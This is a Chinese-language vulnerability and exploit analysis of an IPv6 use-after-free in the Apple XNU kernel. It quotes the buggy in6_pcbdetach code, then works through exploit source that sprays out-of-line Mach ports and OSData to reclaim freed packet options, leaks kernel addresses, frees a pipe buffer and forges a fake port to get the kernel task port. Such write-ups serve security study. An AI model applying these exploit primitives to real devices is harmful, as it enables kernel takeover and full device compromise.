# ipv6 uaf

## 漏洞分析
```
void
in6_pcbdetach(struct inpcb *inp)
{
    // ...
    if (!(so->so_flags & SOF_PCBCLEARING)) {
        struct ip_moptions *imo;
        struct ip6_moptions *im6o;

        inp->inp_vflag = 0;
        if (inp->in6p_options != NULL) {
            m_freem(inp->in6p_options);
            inp->in6p_options = NULL; // <- good
        }
        ip6_freepcbopts(inp->in6p_outputopts); // <- bad
        ROUTE_RELEASE(&inp->in6p_route);
        // free IPv4 related resources in case of mapped addr
        if (inp->inp_options != NULL) {
            (void) m_free(inp->inp_options); // <- good
            inp->inp_options = NULL;
        }
```
程序释放后没有清空指针，从而造成uaf


## exp分析
```

bool Exploit::GetKernelTaskPort() {
  uint64_t fd_ofiles;
  if (!GetFdOfiles(&fd_ofiles)) {
    printf("Failed to fetch fd_ofiles\n");
    return false;
  }
```
首先程序获得fd表的地址

```
bool Exploit::GetFdOfiles(uint64_t *fd_ofiles) {
  if (fd_ofiles_) {
    *fd_ofiles = fd_ofiles_;
    return true;
  }

  StageOne stage_one;

  uint64_t task_port;
  if (!stage_one.GetPortAddr(mach_task_self(),
                             io_makebits(1, IOT_PORT, IKOT_TASK), &task_port)) {
    printf("Failed to fetch task_port kaddr\n");
    return false;
  }
```
```
bool StageOne::GetPortAddr(mach_port_t port, uint32_t expected_ip_bits,
                           uint64_t *port_kaddr) {
  sprayer_.Clear();

  std::vector<std::unique_ptr<DanglingOptions>> dangling_options;
  for (int i = 0; i < kDanglingOptionSprayCount; i++) {
    dangling_options.emplace_back(new DanglingOptions);
  }

  for (uint32_t i = 0; i < kAttempts; i++) {
    if (!sprayer_.SprayOOLPorts(SIZE(ip6_pktopts), port)) {
      printf("GetPortAddr: failed to spray\n");
      return false;
    }
```
首先程序申请ipv6包，然后释放

接着通过申请ool port 来重新使用ipv6包

通过ipv6包的内容获取port地址


```
 if (!stage_one.ReadMany(task_port, task_to_fd_ofiles, fd_ofiles)) {
    printf("Failed to leak fd_ofiles\n");
    return false;
  }
```
```

bool StageOne::ReadFreeInternal(void *address, uint8_t *data, bool freeing) {
  std::vector<std::unique_ptr<DanglingOptions>> dangling_options;
  for (int i = 0; i < kDanglingOptionSprayCount; i++) {
    dangling_options.emplace_back(new DanglingOptions);
  }

  std::unique_ptr<uint8_t[]> buffer(new uint8_t[SIZE(ip6_pktopts)]);
  memset(buffer.get(), 0, SIZE(ip6_pktopts));

  // Set a pattern at the minmtu offset so we can check whether we reclaimed
  // the buffer.
  memset(buffer.get() + OFFSET(ip6_pktopts, ip6po_minmtu), 'B', 4);

  uint64_t address_uint = reinterpret_cast<uint64_t>(address);
  memcpy(buffer.get() + OFFSET(ip6_pktopts, ip6po_pktinfo), &address_uint,
         sizeof(uint64_t));

  for (uint32_t i = 0; i < kAttempts; i++) {
    if (!sprayer_.Spray(buffer.get(), static_cast<uint32_t>(SIZE(ip6_pktopts)),
                        kSprayCount)) {
      printf("Spray failed?\n");
      return false;
    }
    int minmtu = -1;
    for (uint32_t j = 0; j < dangling_options.size(); j++) {
      if (!dangling_options[j]->GetMinmtu(&minmtu)) {
        printf("Stage1: failed to GetMinmtu to detect leak\n");
        return false;
      }
      if (minmtu != 0x42424242) {
        // We don't see the 'B' pattern, keep looking
        usleep(10000);
        continue;
      }

      struct in6_pktinfo pktinfo = {};
      if (freeing) {
        if (!dangling_options[j]->SetPktinfo(&pktinfo)) {
          printf("Stage1: SetPktinfo failed\n");
          return false;
        }
      } else {
        if (!dangling_options[j]->GetPktinfo(&pktinfo)) {
          printf("Stage1: GetPktinfo failed\n");
          return false;
        }
        memcpy(data, &pktinfo, kPktinfoSize);
      }
      return true;
    }
  }

  return false;
}
```
然后通过申请ipv6数据包，然后释放，申请为OSdata的数据，从而控制ipv6数据包

然后通过!dangling_options[j]->GetPktinfo(&pktinfo)
获取相关数据

```
Pipe fake_port_pipe(kPipeBufferSize, fd_ofiles);
  if (!fake_port_pipe.Valid()) {
    printf("Fake port pipe is invalid\n");
    return false;
  }
```
创建一个pipe（fakeport）留作一会使用，为了能够避免进行喷射而造成麻烦，所以前面泄漏了pipe地址

然后再次创建一个pipe（uaf）作为一回释放用


```
if (!stage_one.FreeAddress((void *)uaf_pipe.buffer_kaddr())) {
    printf("Failed to free uaf_pipe_buffer_kaddr\n");
    return false;
  }

```
通过刚才一样的方法让ipv6包与osdata重合，更改指针释放uaf的内存。

```
  }

  Sprayer sprayer;
  bool reclaimed = false;
  for (int i = 0; i < 100; i++) {
    // Spray task port address since we'll be able to take advantage
    // of that later.
    if (!sprayer.SprayOOLPorts(kPipeBufferSize, mach_task_self())) {
      printf("Failed to spray OOL ports again\n");
      return false;
    }
```
再次申请大量ool重新占据uaf
通过修改uaf指向fake_port从而进行漏洞利用

后面是常规套路。
